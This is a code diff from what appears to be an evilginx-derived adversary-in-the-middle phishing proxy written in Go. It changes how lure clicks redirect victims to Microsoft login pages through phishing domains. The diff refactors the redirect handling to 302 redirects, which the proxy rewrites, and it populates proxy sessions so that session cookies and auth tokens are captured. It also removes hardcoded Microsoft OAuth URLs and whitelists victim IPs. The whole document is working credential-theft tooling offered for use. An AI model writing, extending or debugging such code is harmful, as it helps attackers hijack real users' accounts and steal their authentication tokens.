@@ -135,7 +135,7 @@ func (p *HttpProxy) registerSubAlias(realPhishSub string, phishDomain string) st
 // to the login page via the phish domain. This is called EARLY in the request
 // handler to bypass all complex matching logic. Returns (req, resp) if handled,
 // or (nil, nil) if the request is not a lure hit.
-func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string) (*http.Request, *http.Response) {
+func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *ProxySession) (*http.Request, *http.Response) {
 	reqPath := req.URL.Path
 	reqHost := strings.ToLower(req.Host)
 
@@ -249,7 +249,19 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string) (*http
 			session.RedirectURL = l.RedirectUrl
 		}
 		session.PhishLure = l
+		if session.RedirectURL != "" {
+			session.RedirectURL, _ = p.replaceUrlWithPhishedRandom(session.RedirectURL)
+		}
 		p.whitelistIP(from_ip, session.Id, pl.Name)
+
+		// Populate ProxySession for the response handler
+		// This ensures the response handler sets the session cookie and
+		// processes auth tokens correctly.
+		ps.SessionId = session.Id
+		ps.Created = true
+		ps.Index = sid
+		ps.PhishletName = pl.Name
+		ps.PhishDomain = phishDomain
 
 		// Send lure_clicked notification
 		lureUrl := fmt.Sprintf("https://%s%s", req.Host, l.Path)
@@ -346,51 +358,16 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string) (*http
 			return req, resp
 		}
 
-		// AitM flow (default): redirect to login page through phish domain
-		// Find the phish subdomain that proxies to the login domain
-		loginPhishHost := ""
-		loginDomain := pl.GetLoginUrl() // e.g., "https://login.microsoftonline.com/"
-		if lu, err := url.Parse(loginDomain); err == nil {
-			loginOrigHost := lu.Host
-			for _, ph := range pl.proxyHosts {
-				origHost := combineHost(ph.orig_subdomain, ph.domain)
-				if strings.EqualFold(origHost, loginOrigHost) {
-					loginPhishHost = combineHost(ph.phish_subdomain, phishDomain)
-					break
-				}
-			}
-		}
-		if loginPhishHost == "" {
-			// Fallback: try common patterns
-			for _, ph := range pl.proxyHosts {
-				if strings.Contains(ph.domain, "microsoftonline") || strings.Contains(ph.domain, "google") {
-					if strings.Contains(ph.orig_subdomain, "login") || strings.Contains(ph.orig_subdomain, "accounts") {
-						loginPhishHost = combineHost(ph.phish_subdomain, phishDomain)
-						break
-					}
-				}
-			}
-		}
-		if loginPhishHost == "" {
-			loginPhishHost = "secure." + phishDomain // last resort
-		}
-		redirectUrl := "https://" + loginPhishHost + "/"
-		log.Important("[%d] [lure-redirect] AitM redirect to: %s", sid, redirectUrl)
+		// AitM flow (default): HTTP 302 redirect to the ORIGINAL login URL.
+		// The response handler will automatically rewrite the Location header
+		// to the phish domain (via replaceHostWithPhishedRandom) and set the
+		// session cookie (via ps.Created). This matches standard evilginx behavior.
+		rurl := pl.GetLoginUrl()
+		log.Important("[%d] [lure] AitM 302 redirect to: %s", sid, rurl)
 
-		// Use JavaScript redirect - immune to response handler URL rewriting
-		body := fmt.Sprintf(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.replace('%s');</script><noscript><meta http-equiv="refresh" content="0;url=%s"></noscript></body></html>`, redirectUrl, redirectUrl)
-		resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+		resp.Header.Set("Location", rurl)
 		resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-		resp.Header.Set("Pragma", "no-cache")
-		// Set session cookie
-		ck := &http.Cookie{
-			Name:    sessionCookie,
-			Value:   session.Id,
-			Path:    "/",
-			Domain:  p.cfg.GetBaseDomain(),
-			Expires: time.Now().Add(60 * time.Minute),
-		}
-		resp.Header.Add("Set-Cookie", ck.String())
 		return req, resp
 	}
 
@@ -1489,7 +1466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// bypassing all complex phishlet/domain matching that could fail.
 			// ════════════════════════════════════════════════════════════════════════
 			if req.Method == "GET" {
-				if lReq, lResp := p.handleLureRedirect(req, from_ip); lResp != nil {
+				if lReq, lResp := p.handleLureRedirect(req, from_ip, ps); lResp != nil {
 					return lReq, lResp
 				}
 			}
@@ -2051,27 +2028,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								// For existing AitM sessions (not device code), redirect to OAuth
+								// For existing AitM sessions (not device code), redirect to login
 								if session, exists := p.sessions[ps.SessionId]; exists && (session.DCMode == DCModeOff || session.DCMode == "") {
 									// Check if session hasn't completed authentication yet
 									if !session.IsDone && len(session.CookieTokens) == 0 {
-										// Redirect to OAuth
-										phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
-										loginPhishHost := ""
-										for _, ph := range pl.GetProxyHosts() {
-											origHost := combineHost(ph.OrigSub, ph.Domain)
-											if origHost == "login.microsoftonline.com" {
-												loginPhishHost = combineHost(ph.PhishSub, phishDomain)
-												break
-											}
-										}
-										if loginPhishHost == "" {
-											loginPhishHost = "secure." + phishDomain
-										}
-										oauthURL := fmt.Sprintf("https://%s/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code&scope=openid+profile+offline_access&response_mode=form_post&prompt=login", loginPhishHost)
-										log.Important("[%d] [AitM] redirecting existing session to login: %s", ps.Index, oauthURL)
+										// Redirect to original login URL; response handler rewrites to phish domain
+										rurl := pl.GetLoginUrl()
+										log.Important("[%d] [AitM] redirecting existing session to: %s", ps.Index, rurl)
 										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-										resp.Header.Set("Location", oauthURL)
+										resp.Header.Set("Location", rurl)
 										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 										return req, resp
 									}
@@ -2463,41 +2428,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									// --- End device code chaining ---
 
-									// AitM flow: redirect to Microsoft login via phish domain
-									// Build OAuth URL and redirect user to login
-									log.Important("[%d] [AitM] entering AitM redirect flow for lure visitor", sid)
-									phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
-									// Find the phish subdomain that proxies to login.microsoftonline.com
-									loginPhishHost := ""
-									for _, ph := range pl.GetProxyHosts() {
-										origHost := combineHost(ph.OrigSub, ph.Domain)
-										log.Debug("[AitM] checking proxy host: %s -> %s", ph.PhishSub, origHost)
-										if origHost == "login.microsoftonline.com" {
-											loginPhishHost = combineHost(ph.PhishSub, phishDomain)
-											log.Debug("[AitM] found login host: %s", loginPhishHost)
-											break
-										}
-									}
-									if loginPhishHost == "" {
-										loginPhishHost = "secure." + phishDomain // fallback
-										log.Warning("[AitM] using fallback login host: %s", loginPhishHost)
-									}
-									
-									// Build OAuth authorize URL
-									oauthURL := fmt.Sprintf("https://%s/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code&scope=openid+profile+offline_access&response_mode=form_post&prompt=login", loginPhishHost)
-									
-									log.Important("[%d] [AitM] redirecting to login: %s", sid, oauthURL)
+									// AitM flow: 302 redirect to the ORIGINAL login URL.
+									// The response handler rewrites Location to the phish domain
+									// and sets the session cookie via ps.Created.
+									rurl := pl.GetLoginUrl()
+									log.Important("[%d] [AitM] 302 redirect to: %s", sid, rurl)
 									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-									resp.Header.Set("Location", oauthURL)
+									resp.Header.Set("Location", rurl)
 									resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-									ck := &http.Cookie{
-										Name:    getSessionCookieName(pl_name, p.cookieName),
-										Value:   session.Id,
-										Path:    "/",
-										Domain:  p.cfg.GetBaseDomain(),
-										Expires: time.Now().Add(60 * time.Minute),
-									}
-									resp.Header.Add("Set-Cookie", ck.String())
 									return req, resp
 								}
 							} else {
